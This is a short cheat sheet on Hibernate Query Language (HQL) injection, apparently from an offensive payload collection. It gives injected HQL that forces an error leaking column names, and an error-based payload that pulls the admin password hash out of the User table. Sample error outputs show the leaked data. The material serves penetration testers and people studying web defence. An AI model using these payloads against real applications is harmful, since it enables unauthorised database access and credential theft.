# Hibernate Query Language Injection 

> Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia
## Summary

* [HQL Comments](#hql-comments)
* [HQL List Columns](#hql-list-columns)
* [HQL Error Based](#hql-error-based)
* [References](#references)

## HQL Comments

```sql
HQL does not support comments
```

## HQL List Columns

```sql
from BlogPosts
where title like '%'
  and DOESNT_EXIST=1 and ''='%' -- 
  and published = true
```

Using an unexisting column will an exception leaking several columns names.

```sql
org.hibernate.exception.SQLGrammarException: Column "DOESNT_EXIST" not found; SQL statement:
      select blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]
```

## HQL Error Based

```sql
from BlogPosts
where title like '%11'
  and (select password from User where username='admin')=1
  or ''='%'
  and published = true
```

Error based on value casting.

```sql
Data conversion error converting "d41d8cd98f00b204e9800998ecf8427e"; SQL statement:
select blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1
```

:warning: **HQL does not support UNION queries**
